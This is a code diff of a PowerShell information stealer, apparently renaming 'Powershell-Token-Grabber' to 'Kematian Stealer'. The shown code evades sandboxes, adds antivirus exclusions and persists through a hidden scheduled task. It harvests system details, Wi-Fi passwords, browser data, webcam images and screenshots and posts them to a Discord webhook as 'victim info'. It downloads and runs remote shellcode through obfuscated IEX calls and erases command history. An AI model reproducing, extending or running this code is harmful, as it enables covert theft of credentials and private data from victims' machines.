@@ -14,7 +14,7 @@ function KDMUTEX {
     $CreatedNew = $false
     $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
     if ( -not $CreatedNew ) {
-        throw "An instance of this script is already running."
+        throw "[!] An instance of this script is already running."
     }
     else {
         if ($debug) {
@@ -29,7 +29,7 @@ function KDMUTEX {
 Add-Type -AssemblyName PresentationCore, PresentationFramework
 
 $webhook = "YOUR_WEBHOOK_HERE"
-$avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
+$avatar = "https://i.imgur.com/DOIYOtp.gif"
 
 
 #THIS CODE WAS MADE BY EvilByteCode
@@ -110,7 +110,7 @@ function Search-Username ($usernames) {
 function ram_check {
     $ram = (Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
     if ($ram -lt 4) {
-        make_error_page "RAM CHECK FAILED"
+        make_error_page "[!] RAM CHECK FAILED" -ForegroundColor Red
         Start-Sleep -Seconds 3
         exit
     }
@@ -197,7 +197,7 @@ function Invoke-ANTITOTAL {
             $output = & $function.Name $content
             
             if ($output -eq $true) {
-                make_error_page "Detected VM"
+                make_error_page "[!] Detected VM" -ForegroundColor Red
                 Start-Sleep -s 3
                 exit
             }
@@ -244,7 +244,7 @@ function Backup-Data {
     $timezoneString = "UTC$offsetHours"
     $filedate = Get-Date -Format "yyyy-MM-dd"
     $countryCode = (Invoke-WebRequest -Uri "https://ipapi.co/$ip/country_code" -UseBasicParsing).Content
-    $folderformat = "$env:APPDATA\KDOT\$countryCode-($uuid)-($filedate)-($timezoneString)"
+    $folderformat = "$env:APPDATA\Kematian\$countryCode-($uuid)-($filedate)-($timezoneString)"
 
     $folder_general = $folderformat
     $folder_messaging = "$folderformat\Messaging Sessions"
@@ -282,10 +282,10 @@ function Backup-Data {
     $guid = [Guid]::NewGuid()
     $guidString = $guid.ToString()
     $suffix = $guidString.Substring(0, 8)  
-    $prefixedGuid = "powershell-token-grabber-" + $suffix
-    $ptgbanner = ("4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQrilZEgICAgICAgICAgICAgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAgICDilojilojilojilojilojilojilojilojilZcgICAg4paI4paI4paI4paI4paI4paI4pWXICAgICAgICAgICAgICAgIOKVkQ0K4pWRICAgICAgICAgICAgICAgICDilojilojilZTilZDilZDilojilojilZcgICDilZrilZDilZDilojilojilZTilZDilZDilZ0gICDilojilojilZTilZDilZDilZDilZDilZ0gICAgICAgICAgICAgICAg4pWRDQrilZEgICAgICAgICAgICAgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnSAgICAgIOKWiOKWiOKVkSAgICAgIOKWiOKWiOKVkSAg4paI4paI4paI4pWXICAgICAgICAgICAgICAg4pWRIA0K4pWRICAgICAgICAgICAgICAgICDilojilojilZTilZDilZDilZDilZ0gICAgICAg4paI4paI4pWRICAgICAg4paI4paI4pWRICAg4paI4paI4pWRICAgICAgICAgICAgICAg4pWRIA0K4pWRICAgICAgICAgICAgICAgICDilojilojilZEgICAgIOKWiOKWiOKVlyAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVl+KVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVnSAgICAgICAgICAgICAgIOKVkQ0K4pWRICAgICAgICAgICAgICAgICDilZrilZDilZ0gICAgIOKVmuKVkOKVnSAgIOKVmuKVkOKVnSAgIOKVmuKVkOKVnSDilZrilZDilZDilZDilZDilZDilZ0gICAgICAgICAgICAgICAg4pWRDQrilZEgIGh0dHBzOi8vZ2l0aHViLmNvbS9DaGlsZHJlbk9mWWFod2VoL1Bvd2Vyc2hlbGwtVG9rZW4tR3JhYmJlciAg4pWRDQrilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0NCg==")
-    $ptgstrings = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ptgbanner))
-    $ptginfo = "$ptgstrings`nLog Name : $hostname `nBuild ID : $prefixedGuid`n"
+    $prefixedGuid = "Kematian-Stealer-" + $suffix
+    $kematian_banner = ("4pWU4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWXDQrilZEgICAgICAgICAgICAgICAg4paI4paI4pWXICDilojilojilZfilojilojilojilojilojilojilojilZfilojilojilojilZcgICDilojilojilojilZcg4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVlyDilojilojilojilojilojilZcg4paI4paI4paI4pWXICAg4paI4paI4pWXICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilZcg4paI4paI4pWXICAgICDilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcgICAgICAgICAgICAgICAgIOKVkQ0K4pWRICAgICAgICAgICAgICAgIOKWiOKWiOKVkSDilojilojilZTilZ3ilojilojilZTilZDilZDilZDilZDilZ3ilojilojilojilojilZcg4paI4paI4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4paI4paI4pWXICDilojilojilZEgICAg4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4paI4paI4pWU4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4pWQ4pWd4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZcgICAgICAgICAgICAgICAg4pWRDQrilZEgICAgICAgICAgICAgICAg4paI4paI4paI4paI4paI4pWU4pWdIOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4pWU4paI4paI4paI4paI4pWU4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4paI4pWR4paI4paI4pWU4paI4paI4pWXIOKWiOKWiOKVkSAgICDilojilojilojilojilojilojilojilZcgICDilojilojilZEgICDilojilojilojilojilojilZcgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkeKWiOKWiOKVkSAgICAg4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilZTilZ0gICAgICAgICAgICAgICAg4pWRDQrilZEgICAgICAgICAgICAgICAg4paI4paI4pWU4pWQ4paI4paI4pWXIOKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWR4pWa4paI4paI4pWU4pWd4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWR4pWa4paI4paI4pWX4paI4paI4pWRICAgIOKVmuKVkOKVkOKVkOKVkOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVlOKVkOKVkOKVnSAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilZTilZDilZDilZ0gIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlyAgICAgICAgICAgICAgICDilZENCuKVkSAgICAgICAgICAgICAgICDilojilojilZEgIOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSDilZrilZDilZ0g4paI4paI4pWR4paI4paI4pWRICDilojilojilZEgICDilojilojilZEgICDilojilojilZHilojilojilZEgIOKWiOKWiOKVkeKWiOKWiOKVkSDilZrilojilojilojilojilZEgICAg4paI4paI4paI4paI4paI4paI4paI4pWRICAg4paI4paI4pWRICAg4paI4paI4paI4paI4paI4paI4paI4pWX4paI4paI4pWRICDilojilojilZHilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilojilZfilojilojilZEgIOKWiOKWiOKVkSAgICAgICAgICAgICAgICDilZENCuKVkSAgICAgICAgICAgICAgICDilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAgICAg4pWa4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ0gICDilZrilZDilZ0gICDilZrilZDilZ3ilZrilZDilZ0gIOKVmuKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWQ4pWQ4pWdICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnSAgIOKVmuKVkOKVnSAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWd4pWa4pWQ4pWdICDilZrilZDilZ0gICAgICAgICAgICAgICAg4pWRDQrilZEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGh0dHBzOi8vZ2l0aHViLmNvbS9DaGlsZHJlbk9mWWFod2VoL0tlbWF0aWFuLVN0ZWFsZXIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQ0K4pWRICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZWQgVGVhbWluZyBhbmQgT2ZmZW5zaXZlIFNlY3VyaXR5ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZENCuKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVnQ0K")
+    $kematian_strings = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($kematian_banner))
+    $kematian_info = "$kematian_strings `nLog Name : $hostname `nBuild ID : $prefixedGuid`n"
 	
     function Get-Uptime {
         $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
@@ -351,7 +351,7 @@ function Backup-Data {
         $results 
     }
     $alldiskinfo = diskdata -wrap -autosize | Format-List | Out-String
-    $info = "$ptginfo`n`n`nIP: $ip `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `n`n[Disk Info] $alldiskinfo `n[Hardware] `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
+    $info = "$kematian_info`n`n`nIP: $ip `nLanguage: $lang `nDate: $date `nTimezone: $timezoneString `nScreen Size: $screen `nUser Name: $username `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `n`n[Disk Info] $alldiskinfo `n[Hardware] `nCPU: $cpu `nCores: $corecount `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime `nAntiVirus: $avlist `n`n[Network] $network `n[Startup Applications] $startupapps `n[Processes] $runningapps `n[Services] $services `n[Software] $software"
     $info | Out-File -FilePath "$folder_general\System.txt" -Encoding UTF8
 
     $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object {
@@ -732,24 +732,24 @@ function Backup-Data {
     Invoke-Crypto_Wallets
 
     $embed_and_body = @{
-        "username"    = "KDOT"
+        "username"    = "Kematian"
         "content"     = "@everyone"
-        "title"       = "KDOT"
-        "description" = "Powerful Token Grabber"
+        "title"       = "Kematian Data Extractor"
+        "description" = "Kematian"
         "color"       = "3447003"
-        "avatar_url"  = "https://i.postimg.cc/k58gQ03t/PTG.gif"
-        "url"         = "https://discord.gg/vk3rBhcj2y"
+        "avatar_url"  = "https://i.imgur.com/6w6qWCB.jpeg"
+        "url"         = "https://discord.com/invite/WJCNUpxnrE"
         "embeds"      = @(
             @{
-                "title"       = "POWERSHELL GRABBER"
-                "url"         = "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/tree/main"
+                "title"       = "Kematian Stealer"
+                "url"         = "https://github.com/ChildrenOfYahweh/Kematian-Stealer"
                 "description" = "New victim info collected !"
                 "color"       = "3447003"
                 "footer"      = @{
-                    "text" = "Made by KDOT, GODFATHER and CHAINSKI"
+                    "text" = "Made by Kdot, Chainski and EvilByteCode"
                 }
                 "thumbnail"   = @{
-                    "url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
+                    "url" = "https://i.imgur.com/6w6qWCB.jpeg"
                 }
                 "fields"      = @(
                     @{
@@ -787,15 +787,15 @@ function Backup-Data {
     # Had to do it like this due to https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=HackTool:PowerShell/EmpireGetScreenshot.A&threatId=-2147224978
     #webcam function doesn't work on anything with .NET 8 or higher. Fix it if you want to use it and make a PR. I tried but I keep getting errors writting to protected memory lol.
     function Get-WebcamIMG {
-        I'E'X(New-Object Net.WebClient)."`D`o`wn`l`oa`d`Str`in`g"("https://github.com/Chainski/PowerShell-Token-Grabber/raw/main/frontend-src/webcam.ps1")
+        I'E'X(New-Object Net.WebClient)."`D`o`wn`l`oa`d`Str`in`g"("https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
     }
     Get-WebcamIMG
 
-    $items = Get-ChildItem -Path "$env:APPDATA\KDOT" -Filter out*.jpg
+    $items = Get-ChildItem -Path "$env:APPDATA\Kematian" -Filter out*.jpg
     foreach ($item in $items) {
         $name = $item.Name
-        curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$env:APPDATA\KDOT\$name\`"" $webhook | out-null
-        Remove-Item -Path "$env:APPDATA\KDOT\$name" -Force
+        curl.exe -F "payload_json={\`"username\`": \`"Kematian\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$env:APPDATA\Kematian\$name\`"" $webhook | out-null
+        Remove-Item -Path "$env:APPDATA\Kematian\$name" -Force
     }
 
     # Works since most victims will have a weak password which can be bruteforced
@@ -888,20 +888,20 @@ function Backup-Data {
     #    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force -ErrorAction 'SilentlyContinue'  | Out-Null
     #}
     #catch {}
-
-    Start-BitsTransfer -Source "https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/download/AutoBuild/grabber.exe" -Destination "$env:LOCALAPPDATA\Temp\main.exe"
-
-    #Stop-Process -Name "discord" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
-    #Stop-Process -Name "discordcanary" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
-    #Stop-Process -Name "discordptb" -Force -ErrorAction 'SilentlyContinue'  | Out-Null
-
-
-    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
+    
+	#Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
+	
+	Write-Host "`r `n"
+	Write-Host "[!] Injecting Shellcode !"
+    $kematian_shellcode = ("https://github.com/Chainski/Kematian-Stealer/raw/main/frontend-src/kematian_shellcode.ps1")
+    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
+    $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
     $proc.WaitForExit()
+    Write-Host "[!] Shellcode Injection Completed !" -ForegroundColor Green
+ 
 
     $main_temp = "$env:localappdata\temp"
-    $avatar = "https://i.postimg.cc/k58gQ03t/PTG.gif"
-
+	
     Add-Type -AssemblyName System.Windows.Forms, System.Drawing
     $screens = [Windows.Forms.Screen]::AllScreens
     $top = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
@@ -916,14 +916,13 @@ function Backup-Data {
     $graphics.Dispose()
     $bmp.Dispose()
 
-    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"KDOT\`", \`"content\`": \`"# :desktop: Screenshot\n\n\`"}" -F "file=@\`"$main_temp\screenshot.png\`"" "$($webhook)" | Out-Null
+    curl.exe -F "payload_json={\`"avatar_url\`":\`"$avatar\`",\`"username\`": \`"Kematian\`", \`"content\`": \`"# :desktop: Screenshot\n\n\`"}" -F "file=@\`"$main_temp\screenshot.png\`"" "$($webhook)" | Out-Null
 
 
     Move-Item "$main_temp\discord.json" $folder_general -Force	
     Move-Item "$main_temp\screenshot.png" $folder_general -Force
     Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force
-    #Move-Item -Path "$main_temp\cookies_netscape.txt" -Destination "$browser_data" -Force
     #move any file that starts with cookies_netscape
     Get-ChildItem -Path $main_temp -Filter "cookies_netscape*" | Move-Item -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\downloads.json" -Destination "$browser_data" -Force
@@ -936,28 +935,28 @@ function Backup-Data {
         $dirs | ForEach-Object { Remove-Item $_ -Force }
     } while ($dirs.Count -gt 0)
 
-    Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
-    curl.exe -X POST -F 'payload_json={\"username\": \"KDOT\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/k58gQ03t/PTG.gif\"}' -F "file=@$env:LOCALAPPDATA\Temp\KDOT.zip" $webhook
+    Compress-Archive -Path "$folder_general" -DestinationPath "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
+    curl.exe -X POST -F 'payload_json={\"username\": \"Kematian\", \"content\": \"\", \"avatar_url\": \"https://i.imgur.com/6w6qWCB.jpeg\"}' -F "file=@$env:LOCALAPPDATA\Temp\Kematian.zip" $webhook
 
-    Remove-Item "$env:LOCALAPPDATA\Temp\KDOT.zip" -Force
+    Remove-Item "$env:LOCALAPPDATA\Temp\Kematian.zip" -Force
     Remove-Item "$folder_general" -Force -Recurse
     Remove-Item "$main_temp\main.exe" -Force
 }
 
 function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
-    Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
-    New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
+    Add-MpPreference -ExclusionPath "$env:APPDATA\Kematian"
+    New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
     # Hidden Directory
-    $KDOT_DIR = get-item "$env:APPDATA\KDOT" -Force
+    $KDOT_DIR = get-item "$env:APPDATA\Kematian" -Force
     $KDOT_DIR.attributes = "Hidden", "System"
-    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
-    $task_name = "KDOT"
-    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\KDOT\KDOT.ps1",0)(window.close)'
+    Copy-Item -Path $PSCommandPath -Destination "$env:APPDATA\Kematian\Kematian.ps1" -Force
+    $task_name = "Kematian"
+    $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\Kematian\Kematian.ps1",0)(window.close)'
     $task_trigger = New-ScheduledTaskTrigger -AtLogOn
     $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
-    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "KDOT" -RunLevel Highest -Force
-    Write-Host "Task Created" -ForegroundColor Green
+    Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "Kematian" -RunLevel Highest -Force
+    Write-Host "[!] Task Created" -ForegroundColor Green
 
     HOSTS-BLOCKER
     Backup-Data
@@ -970,143 +969,144 @@ if (INVOKE-AC -eq $true) {
     else {
         Hide-Console
         KDMUTEX
-    }
-    #removes history
+    }    
     if ($debug) {
-        Read-Host "Press Enter to continue..."
+        Read-Host "[!] Press Enter to continue..."
     }
     else {
         [ProcessUtility]::MakeProcessKillable()
     }
     $script:SingleInstanceEvent.Close()
     $script:SingleInstanceEvent.Dispose()
+	#removes history
     I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
 }
 else {
-    Write-Host ("Please run as admin!") -ForegroundColor Red
+    Write-Host ("[!] Please run as admin!") -ForegroundColor Red
     Start-Sleep -s 1
     Request-Admin
 }
+
 # SIG # Begin signature block
-# MIIWnAYJKoZIhvcNAQcCoIIWjTCCFokCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
+# MIIWnwYJKoZIhvcNAQcCoIIWkDCCFowCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
 # gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
-# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUySncggOhEhQxg7h+4CDkdY9S
-# 7o+gghDrMIIC/jCCAeagAwIBAgIQNZ2siXh+aIFO470KIbV4ADANBgkqhkiG9w0B
-# AQsFADAXMRUwEwYDVQQDDAxLRE9UIFJvb3QgQ0EwHhcNMjQwNDI1MTgyNTA0WhcN
-# MzQwNDI1MTgzNTA0WjAXMRUwEwYDVQQDDAxLRE9UIFJvb3QgQ0EwggEiMA0GCSqG
-# SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCZpegRqfRB0TgxLaZe09cNUfKKxCkMtTSf
-# AZ7+VSzVFTByUIs4qKgQoCvUhkZK933Kr0bAN+GHJGSKLJ9H0EMGTKQzUOvHc19Y
-# gQaZowyxxK/GEAzF9DlItxwlYqsX1nEGoBovRzstW31s6ETiURhkTa6kS5a4ZUHg
-# iLxwtk1b1Ndetc13tRdtX/VFF0I6K11dgpmlvmjIFJDxrl26+S6MkLgU722lrTfW
-# rgfAdD+fREYIQB9yiy0kQHCzY+7pl2AKIrKK61OQOVXsxAhq3q2AgdUsy9MTXgE7
-# nPK2pXQxnWBDPSzyJFyZXxzO128XipVQRZLCwfDIkaHNGT5iIhrtAgMBAAGjRjBE
-# MA4GA1UdDwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU
-# XkwhRG1dSXF1rLJ1BKloHInnYPswDQYJKoZIhvcNAQELBQADggEBACiMEK92Ue1x
-# 0XEq2hR/XlVYlhbDJGASoHfyTv0Y3U6Mrb7+dE72E2/CTzhXL9T0iQtRVjgdIKEN
-# Q8gfeeWZaIXamxnBzOgak6I/URsszj32Gr4H58KQGxQnixcGDQLgTswqlCVnMNNJ
-# VjCPzSkTWzt0gGl0UYi6t68byqC1xkprVtpYwfreGGm1culRMiRSzGkmDK3nkXDV
-# RyGoDPEXmZ5kHxM/qzeu8foDTJYpZqAozpzBzgybGQKA4iGsVk7BBjGeCZRXo+JD
-# ocCe+l6ujEfpRp9NQdn4XBk6JJYE9kD6vMFdCYIRo+5V7p+3rm/BCSDDvO00v69P
-# j94500kTVCswggbsMIIE1KADAgECAhAwD2+s3WaYdHypRjaneC25MA0GCSqGSIb3
-# DQEBDAUAMIGIMQswCQYDVQQGEwJVUzETMBEGA1UECBMKTmV3IEplcnNleTEUMBIG
-# A1UEBxMLSmVyc2V5IENpdHkxHjAcBgNVBAoTFVRoZSBVU0VSVFJVU1QgTmV0d29y
-# azEuMCwGA1UEAxMlVVNFUlRydXN0IFJTQSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0
-# eTAeFw0xOTA1MDIwMDAwMDBaFw0zODAxMTgyMzU5NTlaMH0xCzAJBgNVBAYTAkdC
-# MRswGQYDVQQIExJHcmVhdGVyIE1hbmNoZXN0ZXIxEDAOBgNVBAcTB1NhbGZvcmQx
-# GDAWBgNVBAoTD1NlY3RpZ28gTGltaXRlZDElMCMGA1UEAxMcU2VjdGlnbyBSU0Eg
-# VGltZSBTdGFtcGluZyBDQTCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB
-# AMgbAa/ZLH6ImX0BmD8gkL2cgCFUk7nPoD5T77NawHbWGgSlzkeDtevEzEk0y/NF
-# Zbn5p2QWJgn71TJSeS7JY8ITm7aGPwEFkmZvIavVcRB5h/RGKs3EWsnb111JTXJW
-# D9zJ41OYOioe/M5YSdO/8zm7uaQjQqzQFcN/nqJc1zjxFrJw06PE37PFcqwuCnf8
-# DZRSt/wflXMkPQEovA8NT7ORAY5unSd1VdEXOzQhe5cBlK9/gM/REQpXhMl/VuC9
-# RpyCvpSdv7QgsGB+uE31DT/b0OqFjIpWcdEtlEzIjDzTFKKcvSb/01Mgx2Bpm1gK
-# VPQF5/0xrPnIhRfHuCkZpCkvRuPd25Ffnz82Pg4wZytGtzWvlr7aTGDMqLufDRTU
-# GMQwmHSCIc9iVrUhcxIe/arKCFiHd6QV6xlV/9A5VC0m7kUaOm/N14Tw1/AoxU9k
-# gwLU++Le8bwCKPRt2ieKBtKWh97oaw7wW33pdmmTIBxKlyx3GSuTlZicl57rjsF4
-# VsZEJd8GEpoGLZ8DXv2DolNnyrH6jaFkyYiSWcuoRsDJ8qb/fVfbEnb6ikEk1Bv8
